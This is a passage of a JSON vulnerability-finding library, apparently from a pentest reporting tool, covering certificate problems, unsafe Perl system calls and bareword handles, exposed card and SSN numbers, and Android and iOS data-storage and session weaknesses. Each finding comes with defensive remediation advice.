legal standpoint. For example, an expired X.509 certificate may affect an organization's reputation and credibility since users can no longer trust its website to perform transactions, such as online purchases.\nIn any case in which certificate related issues are encountered by the browser, an appropriate warning will be issued to end users. If users choose to ignore these warnings and click through them, there will be no guarantee they are accessing the valid application or an impostor leaving them susceptible to Man-In-The-Middle (MITM) attacks.\n","remediation":"Currently-valid X.509 certificates should be utilized and renewed prior to their expiration date.\nTypically, the Certificate Authority (CA) issuing the certificate will remind owners prior to expiration and will help facilitate the renewal process. Once the certificate is renewed, web browsers will no longer display warning messages regarding the validity of the certificate.\nIn general, the following best practices should be followed with respect to X.509 certificates:\n--Obtain certificates from reliable CAs such as VeriSign, GoDaddy, Thawte, etc.\n--Ensure that the entire certificate chain is valid prior to deployment.\n--At a minimum use a 2048 bit private key, and protect them adequately (e.g. via strong passwords).\n--In case of a compromise, revoke old certificates and generate new keys to be used with the new certificates.\n--Only use secure HTTPS protocols (TLSv1.2) and secure cipher suites that provide authentication and encryption of 128 bits or stronger.\n--Client initiated renegotiation should be disabled.\n--Download the Certificate Revocation List (CRL) from your CA at regular intervals (once a week if possible) to ensure up-to-date information regarding revoked certificates is available.\n--Ensure that the signing certificates have been verified against the Certificate Revocation List (CRL).\n--Certificate management tools should be leveraged to automate the discovery and monitoring of all certificates especially in large organizations.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N/E:ND/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":567,"plugin_id":null,"title":"Perl: Bareword File Handler Used","type":null,"description":"There are multiple instances of bareword symbols being used to refer to file handles in the code. Bareword symbols are global and may be unknowingly set to point to multiple file handles at one time.\n","poc":null,"impact":"\n","remediation":"All file handlers should be declared before they are used, or use undefined scalar variable as a lexical reference. Note that STDOUT, STDERR, and STDIN are exceptions to this, as these standard file handles are always package variables. See the below example for the correct manner to define a file handler:\n<pre><code class=\"perl\">open my $fh, '<', $some_file;     \t  my $fh = IO::File->new($some_file); </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":568,"plugin_id":null,"title":"X.509 Certificate About to Expire (SSL/TLS)","type":null,"description":"An X.509 certificate is considered \"About to Expire\" when the current date is nearing its expiration date. Typically, certificate issuers (i.e. certificate authorities) start reminding certificate owners to renew their certificates 90 days prior to expiration.\nX.509 certificates enable users to surf the web securely by facilitating encryption of sensitive data as it flows across the Internet. X.509 certificates are important as they let end users know that they are communicating with trusted websites. Certificate Authorities (CAs) such as VeriSign, Comodo, etc. verify a website's identity and issue an X.509 certificate to the website's owner. When a user visits a website the user's browser and the website exchange keys allowing the transmission of encrypted data. The browser also verifies that the X.509 certificate presented by the website is current and alerts the user with a warning message if the certificate is expired.\n","poc":null,"impact":"If an X.509 certificate that is about to expire isn't renewed prior to expiration, it will be deemed invalid and will no longer be able to secure communication with the end user. Communicating with such a website may compromise users' personal information such as social security number, driver's license number, financial information etc. The loss of sensitive or proprietary information can directly affect end users, as well as the certificate owner from a financial, reputational, or legal standpoint. For example, an expired X.509 certificate may affect an organization's reputation and credibility since users can no longer trust its website to perform transactions, such as online purchases.\nIn any case in which certificate related issues are encountered by the browser, an appropriate warning will be issued to end users. If users choose to ignore these warnings and click through them, there will be no guarantee they are accessing the valid application or an impostor leaving them susceptible to Man-In-The-Middle (MITM) attacks.\n","remediation":"Currently-valid X.509 certificates should be utilized and renewed prior to their expiration date. Typically, the Certificate Authority (CA) issuing the certificate will remind owners prior to expiration and will help facilitate the renewal process. Once the certificate is renewed, web browsers will no longer display warning messages regarding the validity of the certificate.\nIn general, the following best practices should be followed with respect to X.509 certificates:\n--Obtain certificates from reliable CAs such as VeriSign, GoDaddy, Thawte, etc.\n--Ensure that the entire certificate chain is valid prior to deployment.\n--At a minimum use a 2048 bit private key, and protect them adequately (e.g. via strong passwords).\n--In case of a compromise, revoke old certificates and generate new keys to be used with the new certificates.\n--Only use secure HTTPS protocols (TLSv1.2) and secure cipher suites that provide authentication and encryption of 128 bits or stronger.\n--Client initiated renegotiation should be disabled.\n--Download the Certificate Revocation List (CRL) from your CA at regular intervals (once a week if possible) to ensure up-to-date information regarding revoked certificates is available.\n--Ensure that the signing certificates have been verified against the Certificate Revocation List (CRL).\n--Certificate management tools should be leveraged to automate the discovery and monitoring of all certificates especially in large organizations.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N/E:ND/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"High","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":569,"plugin_id":null,"title":"X.509 Certificate Not Yet Valid (SSL/TLS)","type":null,"description":"The \"X.509 certificate Not Yet Valid\" message means that the certificate has a validation date that occurs in the future. This issue may arise as a result of poor certificate management practices (e.g. misconfiguration). A certificate's validity start date is included within the certificate itself, and designates the first day the certificate may be used. For example if a certificate contains a validity start date of 01/01/3050 it is not yet considered a valid certificate.\nX.509 certificates enable users to surf the web securely by facilitating encryption of sensitive data as it flows across the Internet. X.509 certificates are important as they let end users know that they are communicating with trusted websites. Certificate Authorities (CAs) such as VeriSign, Comodo, etc. verify a website's identity and issue an X.509 certificate to the website's owner. When a user visits a website the user's browser and the website exchange keys allowing the transmission of encrypted data. The browser also verifies that the X.509 certificate presented by the website is current and alerts the user with a warning message if the certificate is expired.\n","poc":null,"impact":"X.509 certificates that are not yet valid based on the validity start date may result in the loss of sensitive data. The loss of sensitive or proprietary information can directly affect end users, as well as the certificate owner from a financial, reputational, or legal standpoint. The application's users may be prevented from viewing the web site due to strict security controls within their browser. The invalid certificate can then affect an organization's reputation and credibility since users will no longer be able to trust the website to perform transactions. Furthermore an attacker may take advantage of the invalid certificate and create a malicious site to impersonate the application, and conduct \"phishing\" attacks.\nIn any case in which certificate related issues are encountered by the browser, an appropriate warning will be issued to end users. If users choose to ignore these warnings and click through them, there will be no guarantee they are accessing the valid application or an impostor leaving them susceptible to Man-In-The-Middle (MITM) attacks.\n","remediation":"Currently-valid X.509 certificates should be utilized and renewed prior to their expiration date. Typically, the Certificate Authority (CA) issuing the certificate will remind owners prior to expiration and will help facilitate the renewal process. Once the certificate is renewed, web browsers will no longer display warning messages regarding the validity of the certificate.\nIn general, the following best practices should be followed with respect to X.509 certificates:\n--Obtain certificates from reliable CAs such as VeriSign, GoDaddy, Thawte, etc.\n--Ensure that the entire certificate chain is valid prior to deployment.\n--At a minimum use a 2048 bit private key, and protect them adequately (e.g. via strong passwords).\n--In case of a compromise, revoke old certificates and generate new keys to be used with the new certificates.\n--Only use secure HTTPS protocols (TLSv1.2) and secure cipher suites that provide authentication and encryption of 128 bits or stronger.\n--Client initiated renegotiation should be disabled.\n--Download the Certificate Revocation List (CRL) from your CA at regular intervals (once a week if possible) to ensure up-to-date information regarding revoked certificates is available.\n--Ensure that the signing certificates have been verified against the Certificate Revocation List (CRL).\n--Certificate management tools should be leveraged to automate the discovery and monitoring of all certificates especially in large organizations.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N/E:ND/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":570,"plugin_id":null,"title":"Credit Card Number Pattern Found","type":null,"description":"The application returns credit card numbers to the client in HTTP responses. These numbers are not necessarily displayed to the user directly, but are included in full in the server's response.\n","poc":null,"impact":"Credit card numbers returned in HTTP responses may be intercepted at any point after the data has left the server:\n--In transit during a man-in-the-middle (\"MitM\") attack\n--On the user's system if the HTTP response data is being cached\n--Via injection attacks such as cross-site scripting, which may read the HTML source and transmit credit card numbers to a malicious third party\n\n","remediation":"Full credit card numbers and metadata should not be returned in HTTP responses; instead, the number should be masked server-side and only the masked value should be sent to the client. A masked value refers to an obfuscated version of the data that hides a specific subset of characters. For example, the credit card number \"1234-5678-1234-5678\" would be changed to \"****-****-****-5678\" to mask the full number, while still providing minor detail for context.\nVersion 3.2 of the PCI Data Security Standard (DSS) states that at a maximum, only the first six (6) and last four (4) digits of a primary account number (PAN) should be displayed (or in this case, sent to the client). Many applications opt to display even fewer digits; only the last four (4) digits of the credit card number should be displayed when possible.\nNote that the credit card numbers should be masked server-side rather than by client-side code. Any use of client-side code will still require the full credit card number to be sent in the HTTP response.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":571,"plugin_id":null,"title":"Social Security Number Pattern Found","type":null,"description":"The application returns social security numbers to the client in HTTP responses. These numbers are not necessarily displayed to the user directly, but are included in full in the server's response.\n","poc":null,"impact":"Social security numbers returned in HTTP responses may be intercepted at any point after the data has left the server:\n--In transit during a man-in-the-middle (\"MitM\") attack\n--On the user's system if the HTTP response data is being cached\n--Via injection attacks such as cross-site scripting, which may read the HTML source and transmit SSNs to a malicious third party\n\n","remediation":"Full social security numbers (SSNs) must not be returned in HTTP responses; instead, the SSN should be masked server-side and only the masked value should be sent to the client. A masked value refers to an obfuscated version of the data that hides a specific subset of characters. For example, the SSN \"123-45-6789\" would be changed to \"***-**-6789\" to mask the full number, while still providing minor detail for context.\nMany organizations, including the IRS and Social Security Administration recommend masking the first five (5) digits of a social security number whenever possible; only the last four (4) digits should be displayed (or in this case, sent to the client).\nNote SSNs must be masked server-side rather than by client-side code. Any use of client-side code will still require the full SSN to be sent in the HTTP response.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":572,"plugin_id":null,"title":"Sensitive Data Logged to System Logs (Android)","type":null,"description":"Sensitive data logged to system logs occurs when the application uses the Android logging framework to save sensitive information to system logs. Any attacker with physical access to the system is able to read system logs with the adb logcat command when USB debugging is enabled, even on unrooted devices. Malware or other malicious applications can read system logs on rooted devices and unrooted ones before Android OS 4.2. Malicious applications can also read application logs on devices before Android 4.2, regardless of root status. However, on unrooted devices with Android OS 4.2 and later, only applications with the android.permission.READ_LOGS permission can read logs.\n","poc":null,"impact":"Writing sensitive data to system logs results in the information being read by an attacker.\n","remediation":"The application should not store any type of sensitive information in system logs in release builds. If one code-base is used for both debug and release builds, conditional code can be used to achieve different levels of logging in the application. This can be done manually or using the BuildConfig.DEBUG constant which is set to false if the application is exported for deployment.\n","cvss_base_score":4.9,"cvss_temporal_score":4.1,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":573,"plugin_id":null,"title":"No Authentication After Background Resume (Android)","type":null,"description":"This issue occurs when the application fails to invalidate the user's session upon exiting the foreground. When a user hits the home button in Android, the application will enter the background state, but the process will still be running. An attacker with physical access to the device can resume the application and gain access to the user's session, for as long as the original session remains active on the server.\n","poc":null,"impact":"An attacker with physical access to a device can gain authenticated access to an application after a background resume. This results in a complete authentication bypass for the victim's session and can be used to compromise sensitive information stored within the client application or perform unauthorized actions on behalf of the victim.\n","remediation":"The application should force the user to authenticate whenever entering the foreground. Upon entering the background, the application should invalidate the session on both the client and the server. These actions can be performed using the onPause()[1] and onResume()[2] methods.\n[1] http://developer.android.com/reference/android/app/Activity.html#onPause()\n[2] http://developer.android.com/reference/android/app/Activity.html#onResume()\n","cvss_base_score":6.8,"cvss_temporal_score":5.6,"cvss_vector":"(AV:L/AC:L/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":574,"plugin_id":null,"title":"Sensitive Data in WebView Cache (iOS)","type":null,"description":"Sensitive data contained in HTTP and HTTPS responses received by the application are stored on the device in an unencrypted local database. Additionally, the thumbnail images of the uploaded photos are also stored in the Cache. \nBy default, UIWebView caches HTTP and HTTPS responses in an unencrypted local database for an indeterminate amount of time unless the response contains a cache-related header that instructs it not to. The responses are stored in a SQLite database called cache.db in the application's Library/Caches directory. An attacker that has local access to the device may jailbreak it to gain access to the database's contents through SQLite commands. A remote attacker could also gain access to this directory, but would require a separate vulnerability in the application, such as command injection or directory traversal, to gain access to the database.\nThe presence of sensitive data in the UIWebView cache may result in data leakage from the application. Attackers with access to the UIWebView could gather information about the application allowing them to create more effectively targeted attacks against the application, as well as obtain private user information.","poc":"","impact":"","remediation":"The application should prevent the caching of any sensitive data within the UIWebView cache on an iOS device. The server should specify the \"Cache-Control: no-cache, no-store\" header in all HTTP responses from the server. If the server's responses cannot be modified, as when the server is controlled by a third-party, the client application should configure the cachePolicy property of its NSURLRequest objects to use a policy that prevents caching before loading them into the UIWebView.","cvss_base_score":4.7,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2019-01-16 06:14:08","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":"","likelihood_text":""},{"id":575,"plugin_id":null,"title":"No Authentication After Background Resume (iOS)","type":null,"description":"The application currently does not invalidate a user's session identifier when the application is sent to the background, nor does it require users to re-authenticate to the application when it is brought to the foreground. An application can be sent to the background through a user's direct interaction with a device by clicking the \"Home\" button, or through an interruption of the user's control such as a phone call or SMS message.  An application that is sent to the background will be placed into either of the following two states: \"background\" and \"suspended\". An application in the \"background\" state will no longer be viewable on the device but will be able to continue executing code. A \"suspended\" application will exist within memory and will not be able to execute any additional code. Neither of the methods used to switch to these states will perform any session management by default.\nFurthermore, this issue can be an indicator of session identifiers not being handled in an appropriate manner on the server. If the application is dormant for an extended period of time and continues to use the original session identifier on returning to an active state, the server may not be enforcing proper session timeouts.\n","poc":null,"impact":"The lack of authentication after a background application is resumed may allow an attacker with physical access to the iOS device to gain unauthorized access to the application. As a user's session is maintained on the client, an attacker with access to the inactive application can bypass all authentication and authorization checks in place by resuming the application. This then provides the attacker with direct access to sensitive information stored on the client, as well as on the server through backend service calls. Furthermore, possession of a valid session identifier allows an attacker to submit unauthorized requests to the application on behalf of the victim. For instance, altering the user's credentials would fully compromise the account.\n","remediation":"Each time an application is moved from the background to an active state, the application should prompt end users to re-enter their credentials to gain access to the application. An application can be configured to verify a user's credentials each time it is brought to the foreground by leveraging the \"UIApplicationDelegate\" protocol. This protocol defines multiple methods that are called upon by the \"UIApplication\" object as a device changes state. The \"applicationDidBecomeActive:\" method is specified in this protocol and is called under the following circumstances, all of which represent the application being brought into the foreground:\n--The application is launched for the first time after the \"application:didFinishLaunchingWithOptions:\" method is called.\n--After the \"applicationWillEnterForeground:\" method is called and there is no URL present.\n--After the \"application:handleOpenURL:\" method is called.\n--After the \"applicationWillResignActive:\" method is called when an end user ignores an interrupt.\n\nAdditionally, the application should invalidate a user's current session identifier when the application is sent to the background. This includes nullifying the identifier client side, as well as server side. If an application contains functionality that must run while the application is in the \"background\" state, it may request additional time before being completely suspended. All applications by default will be given five seconds of processing time once the application enters the \"background\" state, which can be extended to ten minutes by calling the \"beginBackgroundTaskWithExpirationHandler:\" method. Applications may also be placed into the \"background\" state indefinitely, allowing them to continue functioning beyond that time limit. This should only be done if the functionality is a requirement of the business and meets one or more of the following criteria:\n--The application must play continuous audio.\n--The application must continuously track the user's location.\n--The application must use a listener for incoming VOIP calls.\n--The application must download new content in real time.\n--The application receives continuous updates from an external accessory or device.\n\n","cvss_base_score":6.8,"cvss_temporal_score":5.6,"cvss_vector":"(AV:L/AC:L/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":576,"plugin_id":null,"title":"Sensitive Data Stored Unencrypted in Local Storage (Android)","type":null,"description":"Sensitive data is stored locally on the device in an unencrypted format. Sensitive data may be stored by the application in various locations inside a device, such as within SQL lite databases, XML configuration files, the application's private directory, the SD card as well as in application and system logs. All these locations store data as plain text by default. Although local device storage is protected by the Android sandbox and is normally secure, this does not apply when a device has been compromised. Moreover, while some devices have file system encryption enabled, this is not typically the default setting and could be defeated in case of a compromise.\n","poc":null,"impact":"Storing sensitive data in the local storage unencrypted may result in data being exposed to an attacker. Some locations may be accessible without elevated privileges, such as the SD card. Data stored in locations protected by the Android sandbox may be leaked to an attacker if the device becomes physically compromised, or in the event of a malware compromise. Data that may be accessed by an attacker can include, but is not limited to:\n--Personally Identifiable Information\n--Authentication Credentials/Tokens\n--Account data\n\n","remediation":"The storage of sensitive data locally on a device should be avoided when possible. The storage of sensitive data locally on a device should be avoided when possible. Sensitive data should be temporarily downloaded from a server in a secure way after user authentication. If sensitive data needs to be used offline, this data must be stored encrypted by the application. The encryption key should be derived from user input via a key derivation function such as PBKDF2, which is supported in Android via the PBEKeySpec family of classes. The application should force the end user to select a strong password to provide the function with sufficient entropy.\nAlternatively, if a password prompt is undesirable, sensitive data could be encrypted using a randomly generated key which is stored inside the device's Keystore and unlocked by the user's fingerprint or device password when it needs to be used. Note however this method is only applicable and secure on devices that feature a hardware-backed Keystore.\nAdditionally, if data is being stored within a database, a library such as SQLCipher can be used to protect data, with the password generated as described above.\nAuthentication credentials should never be stored on the device, instead, revocable authentication tokens should be preferred.\n","cvss_base_score":7.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":577,"plugin_id":null,"title":"Sensitive Data Stored Unencrypted in Local Storage (iOS)","type":null,"description":"Sensitive data is stored locally on the device in an unencrypted format. Sensitive data may be stored by the application in various locations inside a device, such as within SQL lite databases, configuration files, the cache directory as well as in application and system logs. Although local device storage is protected by the iOS sandbox and is normally secure, this does not apply when a device has been compromised.\n","poc":null,"impact":"Storing sensitive data in the local storage without encryption may result in data being exposed to an attacker. Data stored in locations protected by the iOS sandbox may be leaked to an attacker if the device becomes physically compromised, or in the event of a malware compromise. Data that may be accessed by an attacker can include, but is not limited to:\n--Personally Identifiable Information\n--Authentication Credentials/Tokens\n--Account data\n\n","remediation":"Sensitive data should be temporarily downloaded from a server in a secure way after user authentication. If sensitive data needs to be used offline, this data must be stored encrypted by the application and should not use the NSFileProtectionNone attribute. The encryption key should be derived from user input via a key derivation function such as PBKDF2, which is supported in iOS via the CommonCrypto library. The application should force the end user to select a strong password to provide the function with sufficient entropy. \nAlternatively, if a password prompt is undesirable, sensitive data could be encrypted using a randomly generated key which is stored inside the device's Secure Enclave, using the Keychain API. The kSecAccessControlUserPresence flag is recommended so that the key is unlocked by the user's fingerprint or device password when it needs to be used. The keychain will provide a storage facility for data across applications installed on the device, and will prevent an attacker from accessing the data store. It must be noted however that the keychain may be accessible by an attacker if the device is jailbroken and as such it should not be used as the only remediation. \nAdditionally, if data is being stored within a database, a library such as SQLCipher can be used to protect data, with the password generated as described above. \nAuthentication credentials should never be stored on the device, instead, revocable authentication tokens should be preferred.\n","cvss_base_score":7.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":578,"plugin_id":null,"title":"Perl: Unsafe Use of System Function Call","type":null,"description":"The Perl \"system\" function is invoked to execute commands containing user defined data. When special characters are passed into the \"system\" function they are sent to the shell by Perl, meaning that any relative path elements, null characters, or shell commands will be seen as valid data and will be executed. The \"system\" function can be used by a malicious user to execute commands directly in a shell.\n","poc":null,"impact":"\n","remediation":"Input validation needs to be performed on all user input that is passed into the \"system\" function. The recommended method of input validation is to employ a white-list filter of known-good character, causing the application to accept only inputs that have expected values.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":579,"plugin_id":null,"title":"Lack of Integrity Check on WebView Content (iOS)","type":null,"description":"The application renders HTML/JavaScript content that is stored on the local storage through UIWebView, which is susceptible to tampering. As UIWebView content is rendered in the same way that Safari would render an HTML page, users are susceptible to common web attacks if the proper security controls are not in place. For instance, an attacker with physical access to the device storage can modify the files to execute custom scripts since the content being rendered in the UIWebView is stored locally. Performing modifications does not require that the device be jailbroken since they can be made using a file explorer application such as iFile. If a device is jailbroken malware residing on the device can modify the contents of the UIWebView content to carry out additional attacks, due to the fact the malware can bypass the application sandbox to modify the files of other applications.\n","poc":null,"impact":"An attacker who has physical access to the device storage or malware residing on a jailbroken device can modify the HTML/JavaScript content that is stored locally and add arbitrary malicious JavaScript. When UIWebView renders the pages, it could execute malicious attacks (note that content in the Application folder can be modified without jailbreaking the device). As a result, the end-user becomes vulnerable to a number of attacks such as phishing. Furthermore, the HTML/JavaScript content rendered using a UIWebView will have access to the application sandbox and can result in complete loss of integrity.\n","remediation":"The application should enforce strict integrity checks on local content of the application. If possible, storing HTML/JavaScript content locally should be avoided. This can be done by requesting the resource from the server each time it is needed or by replacing all UIWebViews with UIView or UITableView.\nIf the application needs to use locally stored content, integrity checks needs to be enforced. The following is a sample integrity check mechanism:\n--The server should send the digital signature of the files to the application when it is installed/updated.\n--The application should store the digital signatures in a secure storage location such as the iOS keychain.\n--Embed the public key required to verify the digital signatures in the application's binary.\n--On application starts up, it should verify the signature of the local resources. If it does not match the stored value, the application should warn the user, quit, or download the authentic files from the server.\n\n","cvss_base_score":7.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":580,"plugin_id":null,"title":"Predictable Encryption Key","type":null,"description":"The application uses a predictable encryption key to protect sensitive data. While an attacker may gain access to a key through different methods, they may be able to guess the key before the validity/sensitivity of data expires. For a key to be predictable it must be created without relying on a random value. The following are several examples of types of non-random encryption keys:\n--Hardcoded or static keys- these keys values never change as they have been included in the application.\n--Keys derived from known variables- encryption key is either a known value (e.g. username, timestamp) or derived from one in such a way that it can be guessed (e,g, concatenating username with a small random value).\n--Flawed Pseudo Random Number Generator (PRNG) keys- key derived in a PRNG without a seed or with a hardcoded/predictable/low-entropy seed will result in a predictable key. Note If the PRNG has design flaws and its output is predictable, then using a random seed will have no effect.\n\n","poc":null,"impact":"Using predictable encryption keys results in the attacker being able to decrypt cipher texts in transit and/or at rest. This effectively breaks confidentiality in the application. Additionally if data is sent unsigned across a network connection a suitably positioned attacker may be able to view and modify the data, effectively performing a Man-in-the-Middle (MitM) attack by intercepting traffic between the application and server/other nodes.\n","remediation":"The use of encryption keys that are derived in a predictable manner should be avoided. If there is a need to encrypt and store data on the device, choose a key derived from the user's password using PBKDF2 or a similar algorithm. A Cryptographically Secure Pseudo Random Number Generator (CSPRNG) can also be used to generate keys, such as Java's SecureRandom. Before choosing a PRNG, research it for design flaws. Avoid using non-standard PRNGs as they are less studied. However, not all standard PRNGs are safe (e.g. DUAL EC DRBG). Key creation location is also important. The key should be preferably created server side and stored in a Hardware Security Module (HSM). If such a device is not available, creating keys server-side is preferable to client-side (or on the device).\nAdditionally, avoid using hardcoded keys in source code and in configuration files. If keys and other sensitive data need to be saved on device, use a separate key to encrypt them. Configuration files on the client are accessible to attackers and depending on the development platform, source code, or parts of it can be reverse engineered. Pay close attention to keys stored in memory and reset or overwrite them when no longer needed. Beware of \"dead store\" when resetting keys; dead store happens when a block of memory is overwritten but never used in the application anymore. As a result, if a key is overwritten but not used, compiler optimization routines may classify it as dead store and remove the overwriting instructions.\n","cvss_base_score":7.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":581,"plugin_id":null,"title":"Weak Client-Side Authentication Scheme (Android)","type":null,"description":"A client-side authentication scheme is used, rather than a server-side authentication scheme. Locally enforced authentication schemes, such as checks performed on a local file-based database, can be bypassed and therefore do not provide adequate protection of restricted functionality and/or content.\n","poc":null,"impact":"A client-side authentication scheme is used, which allows an attacker to bypass authentication-based restrictions. Because no server side authentication occurs, attackers can reverse engineer the application and bypass any locally enforced restrictions. For example, if an application performs a check against locally stored credentials prior to executing restricted functionality, an attacker can modify the functionality of the application to skip this check and execute the restricted functionality and/or content.\n","remediation":"The authentication scheme used by the application must be implemented solely within server-side logic. Security and usability are two primary things to consider when choosing a server-sided authentication scheme; ideally no sensitive authentication information should be stored on the device (e.g. username, password, or tokens). For highly sensitive applications, the user should be required to log in every time the application is started or opened, depending on the sensitivity level of the data being handled. Any tokens generated through this process should only remain in memory (only while the application is in the foreground, if requiring re-entry of credentials each time the application is opened) and not be persistent (written to disk). For less sensitive applications, tokens generated through the use of a server-side authentication mechanism can be securely stored instead of credentials. In this way, the token can be invalidated by the server after a set time limit, which would render the token on the device useless until a valid user re-authenticates to the application. If choosing to store tokens, the SharedPreferences class should be used to store the tokens. The tokens then should be encrypted with a mechanism that utilizes a passcode obtained from the user, such as a PIN. The passcode (or PIN) will act as a key that will be used to decrypt the token when it is retrieved from the file system through the SharePreferences class.\n","cvss_base_score":7.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":582,"plugin_id":null,"title":"Weak Client-Side Authentication Scheme (iOS)","type":null,"description":"A client-side authentication scheme is used, rather than a server-side authentication scheme. Locally enforced authentication schemes, such as checks performed on a local file-based database, can be bypassed and therefore do not provide adequate protection of restricted functionality and/or content.\n","poc":null,"impact":"A client-side authentication scheme is used, which allows an attacker to bypass authentication-based restrictions. Because no server side authentication occurs, attackers can reverse engineer the application and bypass any locally enforced restrictions. For example, if an application performs a check against locally stored credentials prior to executing restricted functionality, an attacker can modify the functionality of the application to skip this check and execute the restricted functionality and/or content.\n","remediation":"The authentication scheme used by the application must be implemented solely within server-side logic. Security and usability are two primary things to consider when choosing a 